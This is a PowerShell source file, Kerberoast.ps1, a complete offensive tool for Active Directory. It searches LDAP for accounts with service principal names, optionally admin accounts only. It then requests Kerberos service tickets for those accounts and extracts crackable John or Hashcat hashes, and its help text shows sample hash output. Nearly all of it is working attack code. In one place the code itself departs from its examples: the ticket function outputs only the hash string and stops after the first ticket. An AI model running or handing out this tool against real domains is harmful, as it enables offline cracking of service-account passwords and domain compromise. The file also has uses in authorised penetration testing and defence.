<#

Kerberoast.ps1
Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: None

Note: the primary method of use will be Invoke-Kerberoast with
various targeting options.

#>

function Get-DomainSearcher {
<#
.SYNOPSIS

Helper used by various functions that builds a custom AD searcher object.

Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: Get-NetDomain

.DESCRIPTION

Takes a given domain and a number of customizations and returns a
System.DirectoryServices.DirectorySearcher object. This function is used
heavily by other LDAP/ADSI search function.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects. 

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER SearchBasePrefix

Specifies a prefix for the LDAP search string (i.e. "CN=Sites,CN=Configuration").

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the search.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 'Dacl', 'Group', 'None', 'Owner', 'Sacl'.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainSearcher -Domain testlab.local

Return a searcher for all objects in testlab.local.

.EXAMPLE

Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368)' -Properties 'SamAccountName,lastlogon'

Return a searcher for user objects in testlab.local and only return the SamAccountName and LastLogon properties. 

.EXAMPLE

Get-DomainSearcher -SearchBase "LDAP://OU=secret,DC=testlab,DC=local"

Return a searcher that searches through the specific ADS/LDAP search base (i.e. OU).

.OUTPUTS

System.DirectoryServices.DirectorySearcher
#>

    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1,10000)] 
        [Int]
        $ResultPageSize = 200,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {

        if ($Domain) {
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = (Get-NetDomain).name
        }

        if ($Credential -eq [Management.Automation.PSCredential]::Empty) {
            if (-not $Server) {
                try {
                    # if there's no -Server specified, try to pull the primary DC to bind to
                    $BindServer = ((Get-NetDomain).PdcRoleOwner).Name
                }
                catch {
                    throw 'Get-DomainSearcher: Error in retrieving PDC for current domain'
                }
            }
        }
        elseif (-not $Server) {
            try {
                $BindServer = ((Get-NetDomain -Credential $Credential).PdcRoleOwner).Name
            }
            catch {
                throw 'Get-DomainSearcher: Error in retrieving PDC for current domain'
            }
        }

        $SearchString = 'LDAP://'

        if ($BindServer) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += '/'
            }
        }

        if ($SearchBasePrefix) {
            $SearchString += $SearchBasePrefix + ','
        }

        if ($SearchBase) {
            if ($SearchBase -Match '^GC://') {
                # if we're searching the global catalog, get the path in the right format
                $DN = $SearchBase.ToUpper().Trim('/')
                $SearchString = ''
            }
            else {
                if ($SearchBase -match '^LDAP://') {
                    if ($SearchBase -match "LDAP://.+/.+") {
                        $SearchString = ''
                    }
                    else {
                        $DN = $SearchBase.Substring(7)
                    }
                }
                else {
                    $DN = $SearchBase
                }
            }
        }
        else {
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        $SearchString += $DN
        Write-Verbose "Get-DomainSearcher search string: $SearchString"

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "Using alternate credentials for LDAP connection"
            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }

        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False

        if ($Tombstone) {
            $Searcher.Tombstone = $True
        }

        if ($LDAPFilter) {
            $Searcher.filter = $LDAPFilter
        }

        if ($SecurityMasks) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($Properties) {
            # handle an array of properties to load w/ the possibility of comma-separated strings
            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') } 
            $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }

        $Searcher
    }
}


function Convert-LDAPProperty {
<#
.SYNOPSIS

Helper that converts specific LDAP property result fields and outputs
a custom psobject.

Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: None

.DESCRIPTION

Converts a set of raw LDAP properties results from ADSI/LDAP searches
into a proper PSObject. Used by several of the Get-Net* function.

.PARAMETER Properties

Properties object to extract out LDAP fields for display.

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject with LDAP hashtable properties translated.
#>

    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
            # convert the SID to a string
            $ObjectProperties[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_][0], 0)).Value
        }
        elseif ($_ -eq 'objectguid') {
            # convert the GUID to a string
            $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
        }
        elseif ($_ -eq 'ntsecuritydescriptor') {
            $ObjectProperties[$_] = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
        }
        elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
            # convert timestamps
            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                # if we have a System.__ComObject
                $Temp = $Properties[$_][0]
                [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
            }
            else {
                # otherwise just a string
                $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
            }
        }
        elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
            # try to convert misc com objects
            $Prop = $Properties[$_]
            try {
                $Temp = $Prop[$_][0]
                Write-Verbose $_
                [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
                $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
            }
            catch {
                $ObjectProperties[$_] = $Prop[$_]
            }
        }
        elseif ($Properties[$_].count -eq 1) {
            $ObjectProperties[$_] = $Properties[$_][0]
        }
        else {
            $ObjectProperties[$_] = $Properties[$_]
        }
    }

    New-Object -TypeName PSObject -Property $ObjectProperties
}


function Get-NetDomain {
<#
.SYNOPSIS

Returns a given domain object.

Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: None

.DESCRIPTION

Returns a System.DirectoryServices.ActiveDirectory.Domain object for the current
domain or the domain specified with -Domain X.

.PARAMETER Domain

Specifies the domain name to query for, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-NetDomain -Domain testlab.local

.OUTPUTS

System.DirectoryServices.ActiveDirectory.Domain

.LINK

http://social.technet.microsoft.com/Forums/scriptcenter/en-US/0c5b3f83-e528-4d49-92a4-dee31f4b481c/finding-the-dn-of-the-the-domain-without-admodule-in-powershell?forum=ITCG
#>

    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {

            Write-Verbose "Using alternate credentials for Get-NetDomain"

            if (-not $Domain) {
                # if no domain is supplied, extract the logon domain from the PSCredential passed
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose "Extracted domain '$Domain' from -Credential"
            }
            else {
                $TargetDomain = $Domain
            }

            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "The specified domain does '$TargetDomain' not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid."
                $Null
            }
        }
        elseif ($Domain) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust."
                $Null
            }
        }
        else {
            [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
    }
}


function Get-SPNTicket {
<#
.SYNOPSIS

Request the kerberos ticket for a specified service principal name (SPN).

Author: @machosec, Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: None

.DESCRIPTION

This function will either take one/more SPN strings, or one/more PowerView.User objects
(the output from Get-NetUser) and will request a kerberos ticket for the given SPN
using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted
portion of the ticket is then extracted and output in either crackable John or Hashcat
format (deafult of John).

.PARAMETER SPN

Specifies the service principal name to request the ticket for.

.PARAMETER User

Specifies a PowerView.User object (result of Get-NetUser) to request the ticket for.

.PARAMETER OutputFormat

Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
Defaults to 'John'.

.EXAMPLE

Get-SPNTicket -SPN "HTTP/web.testlab.local"

Request a kerberos service ticket for the specified SPN.

.EXAMPLE

"HTTP/web1.testlab.local","HTTP/web2.testlab.local" | Get-SPNTicket

Request kerberos service tickets for all SPNs passed on the pipeline.

.EXAMPLE

Get-NetUser -SPN | Get-SPNTicket -OutputFormat Hashcat

Request kerberos service tickets for all users with non-null SPNs and output in Hashcat format.

.INPUTS

String

Accepts one or more SPN strings on the pipeline with the RawSPN parameter set.

.INPUTS

PowerView.User

Accepts one or more PowerView.User objects on the pipeline with the User parameter set.

.OUTPUTS

PowerView.SPNTicket

Outputs a custom object containing the SamAccountName, DistinguishedName, ServicePrincipalName, and encrypted ticket section.
#>

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName='RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,

        [Parameter(Position = 1)]
        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'John'
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }

        ForEach ($Object in $TargetObject) {
            if ($PSBoundParameters['User']) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = $Null
                $DistinguishedName = $Null
            }

            # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :)
            if($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]){
                $UserSPN = $UserSPN[0]
            }

            $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            $TicketByteStream = $Ticket.GetRequest()
            if ($TicketByteStream) {
                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
                [System.Collections.ArrayList]$Parts = ($TicketHexStream -replace '^(.*?)04820...(.*)','$2') -Split 'A48201'
                $Parts.RemoveAt($Parts.Count - 1)
                $Hash = $Parts -join 'A48201'
                $Hash = $Hash.Insert(32, '$')

                $Out = New-Object PSObject
                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName

                if ($OutputFormat -match 'John') {
                    $HashFormat = '$krb5tgs$' + $SamAccountName + ':' + $Hash
                }
                else {
                    # hashcat output format
                    $HashFormat = '$krb5tgs$23$*SamAccountName: ' + $SamAccountName + ' ServicePrincipalName: ' + $Ticket.ServicePrincipalName + '*$' + $Hash   
                }
                $Out | Add-Member Noteproperty 'Hash' $HashFormat
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
		
                #Write-Output $Out
                Write-Output $HashFormat
                 
                break
            }
        }
    }
}


function Invoke-Kerberoast {
<#
.SYNOPSIS

Requests service tickets for kerberoast-able accounts and returns extracted ticket hashes.

Author: Will Schroeder (@harmj0y), @machosec
License: BSD 3-Clause
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty

.DESCRIPTION

Implements code from Get-NetUser to quyery for user accounts with non-null service principle
names (SPNs) and uses Get-SPNTicket to request/extract the crackable ticket information.
The ticket format can be specified with -OutputFormat <John/Hashcat>

.PARAMETER Identity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201). 
Wildcards accepted. By default all accounts will be queried for non-null SPNs.

.PARAMETER AdminCount

Switch. Return users with adminCount=1.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects. 

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER OutputFormat

Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat format.
Defaults to 'John'.

.EXAMPLE

Invoke-Kerberoast | fl

SamAccountName       : SQLService
DistinguishedName    : CN=SQLService,CN=Users,DC=testlab,DC=local
ServicePrincipalName : MSSQLSvc/PRIMARY.testlab.local:1433
Hash                 : $krb5tgs$unknown:30FFC786BECD0E88992CBBB017155C53$0343A9C8...

.EXAMPLE

Invoke-Kerberoast -Domain dev.testlab.local | ConvertTo-CSV -NoTypeInformation

"SamAccountName","DistinguishedName","ServicePrincipalName","Hash"
"SQLSVC","CN=SQLSVC,CN=Users,DC=dev,DC=testlab,DC=local","MSSQLSvc/secondary.dev.testlab.local:1433","$krb5tgs$unknown:ECF4BDD1037D1D9E2E091ABBDC92F00E$0F3A4...

.EXAMPLE

Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | fl

SamAccountName       : SQLService
DistinguishedName    : CN=SQLService,CN=Users,DC=testlab,DC=local
ServicePrincipalName : MSSQLSvc/PRIMARY.testlab.local:1433
Hash                 : $krb5tgs$23$*ID#124_DISTINGUISHED NAME: CN=fakesvc,OU=Se
                       rvice,OU=Accounts,OU=EnterpriseObjects,DC=proddfs,DC=pf,
                       DC=fakedomain,DC=com SPN: E3514235-4B06-11D1-AB04-00C04F
                       C2DCD2-ADAM/NAKCRA04.proddfs.pf.fakedomain.com:50000 *30
                       FFC786BECD0E88992CBBB017155C53$0343A9C8A7EB90F059CD92B52
                       ....

.INPUTS

String

Accepts one or more SPN strings on the pipeline with the RawSPN parameter set.

.OUTPUTS

PowerView.SPNTicket

Outputs a custom object containing the SamAccountName, DistinguishedName, ServicePrincipalName, and encrypted ticket section.
#>

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SamAccountName', 'Name')]
        [String[]]
        $Identity,

        [Switch]
        $AdminCount,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1,10000)] 
        [Int]
        $ResultPageSize = 200,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'John'
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $UserSearcher = Get-DomainSearcher @SearcherArguments

        $GetSPNTicketArguments = @{}
        if ($PSBoundParameters['OutputFormat']) { $GetSPNTicketArguments['OutputFormat'] = $OutputFormat }

    }

    PROCESS {
        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_
                if ($IdentityInstance -match '^S-1-.*') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^CN=.*') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                }
                else {
                    try {
                        $Null = [System.Guid]::Parse($IdentityInstance)
                        $IdentityFilter += "(objectguid=$IdentityInstance)"
                    }
                    catch {
                        $IdentityFilter += "(samAccountName=$IdentityInstance)"
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }
            $Filter += '(servicePrincipalName=*)'

            if ($PSBoundParameters['AdminCount']) {
                Write-Verbose 'Searching for adminCount=1'
                $Filter += '(admincount=1)'
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            $UserSearcher.filter = "(&(samAccountType=805306368)$Filter)"
            Write-Verbose "Invoke-Kerberoast search filter string: $($UserSearcher.filter)"

            $Results = $UserSearcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $User = Convert-LDAPProperty -Properties $_.Properties
                $User.PSObject.TypeNames.Insert(0, 'PowerView.User')
                $User
            } | Where-Object {$_.SamAccountName -notmatch 'krbtgt'} | Get-SPNTicket @GetSPNTicketArguments

            $Results.dispose()
            $UserSearcher.dispose()
        }
    }
}
